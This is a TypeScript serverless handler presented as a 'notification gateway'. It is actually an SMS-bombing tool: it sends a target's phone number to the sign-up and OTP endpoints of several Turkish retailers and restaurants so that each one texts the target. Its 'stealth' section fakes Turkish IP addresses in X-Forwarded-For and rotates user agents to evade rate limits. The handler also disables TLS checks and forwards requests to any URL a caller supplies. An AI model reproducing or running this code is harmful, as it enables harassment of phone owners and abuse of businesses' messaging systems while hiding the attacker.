// @ts-nocheck
import type { VercelRequest, VercelResponse } from '@vercel/node';

// SSL Bypass (Legacy sistem simülasyonu için)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ─── TYPES ──────────────────────────────────────────────────────────────────

export interface NotificationRequest {
  recipient: string;        // Telefon numarası
  serviceId: string;
  email?: string;
  metadata?: Record<string, unknown>;
}

export interface NotificationResult {
  provider: string;
  success: boolean;
  error?: string;
  attempts: number;
}

// ─── STEALTH UTILITIES (IP & UA ROTATION) ────────────────────────────────────

const getRandomTurkishIP = () => {
  const blocks = [[88,224,255], [85,96,111], [176,216,223], [195,174,175], [94,54,55]];
  const b = blocks[Math.floor(Math.random() * blocks.length)];
  return `${b[0]}.${Math.floor(Math.random()*(b[2]-b[1]))+b[1]}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
};

const getRandomUA = () => {
  const uas = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0'
  ];
  return uas[Math.floor(Math.random() * uas.length)];
};

// ─── CIRCUIT BREAKER ──────────────────────────────────────────────────────────

class CircuitBreaker {
  private state: "CLOSED" | "OPEN" = "CLOSED";
  private failures = 0;
  private lastFailure = 0;
  private readonly threshold = 3;
  private readonly cooldown = 30000;

  constructor(public readonly name: string) {}

  get isAllowed(): boolean {
    if (this.state === "OPEN" && Date.now() - this.lastFailure > this.cooldown) {
      this.state = "CLOSED";
      this.failures = 0;
    }
    return this.state === "CLOSED";
  }

  onSuccess() { this.failures = 0; this.state = "CLOSED"; }
  onFailure() {
    this.failures++;
    this.lastFailure = Date.now();
    if (this.failures >= this.threshold) this.state = "OPEN";
  }
}

// ─── ADAPTER PATTERN (PROVISIONING LOGIC) ─────────────────────────────────────

interface ProviderAdapter {
  readonly name: string;
  transform(req: NotificationRequest): { body: any; headers: any };
}

class LCWaikikiAdapter implements ProviderAdapter {
  readonly name = "lc_waikiki";
  transform(req: NotificationRequest) {
    const p = req.recipient.replace(/\D/g, '').slice(-10);
    const formatted = `${p.slice(0, 3)} ${p.slice(3, 6)} ${p.slice(6, 8)} ${p.slice(8, 10)}`;
    return {
      body: {
        RegisterFormView: {
          RegisterPhoneNumber: formatted,
          RegisterEmail: req.email || "test@mail.com",
          Password: "Password123!",
          IsSmsChecked: true,
          IsMemberPrivacyRequired: true,
          PhoneAreaCode: "0090",
          ActivationCode: "", CaptchaCode: "", Referer: null
        }
      },
      headers: { "adrum": "isAjax:true", "X-Requested-With": "XMLHttpRequest" }
    };
  }
}

class PidemAdapter implements ProviderAdapter {
  readonly name = "pidem";
  transform(req: NotificationRequest) {
    return {
      body: {
        query: "mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }",
        variables: { phone: req.recipient.slice(-10) }
      },
      headers: { "Origin": "https://pidem.azurewebsites.net" }
    };
  }
}

class KahveDunyasiAdapter implements ProviderAdapter {
  readonly name = "kahve_dunyasi";
  transform(req: NotificationRequest) {
    return {
      body: { countryCode: "90", phoneNumber: req.recipient.slice(-10) },
      headers: { "X-Client-Platform": "web", "X-Language-Id": "tr-TR" }
    };
  }
}

// ─── GATEWAY HANDLER ──────────────────────────────────────────────────────────

const adapters: Record<string, ProviderAdapter> = {
  lc_waikiki: new LCWaikikiAdapter(),
  pidem: new PidemAdapter(),
  kahve_dunyasi: new KahveDunyasiAdapter(),
  dominos: { name: "dominos", transform: (r) => ({ body: { mobilePhone: r.recipient.slice(-10), isSure: false, email: r.email || "test@mail.com" }, headers: {} }) },
  file_market: { name: "file_market", transform: (r) => ({ body: { mobilePhoneNumber: `90${r.recipient.slice(-10)}` }, headers: { "X-Os": "IOS" } }) }
};

const breakers = new Map<string, CircuitBreaker>();

export default async function handler(req: VercelRequest, res: VercelResponse) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    const body = typeof req.body === 'string' ? JSON.parse(req.body) : (req.body || {});
    const { serviceId, serviceUrl, targetPhone } = body;

    // 1. Circuit Breaker Kontrolü
    if (!breakers.has(serviceId)) breakers.set(serviceId, new CircuitBreaker(serviceId));
    const breaker = breakers.get(serviceId)!;

    if (!breaker.isAllowed) {
      return res.status(200).json({ ok: false, error: "Circuit OPEN (Cooldown)" });
    }

    // 2. Adapter Dönüşümü
    const adapter = adapters[serviceId] || { name: "default", transform: (r) => ({ body: { phone: r.recipient }, headers: {} }) };
    const { body: payload, headers: extraHeaders } = adapter.transform({ recipient: targetPhone, serviceId, email: body.email });

    // 3. Stealth Fetch Execution
    const fakeIP = getRandomTurkishIP();
    const response = await fetch(serviceUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': getRandomUA(),
        'X-Forwarded-For': fakeIP,
        'Origin': new URL(serviceUrl).origin,
        'Referer': new URL(serviceUrl).origin + '/',
        ...extraHeaders
      },
      body: JSON.stringify(payload)
    });

    const responseText = await response.text();

    if (response.ok) {
      breaker.onSuccess();
    } else {
      breaker.onFailure();
    }

    return res.status(200).json({
      ok: response.ok,
      upstreamStatus: response.status,
      responsePreview: responseText.substring(0, 150)
    });

  } catch (error: any) {
    return res.status(200).json({ ok: false, error: error.message });
  }
}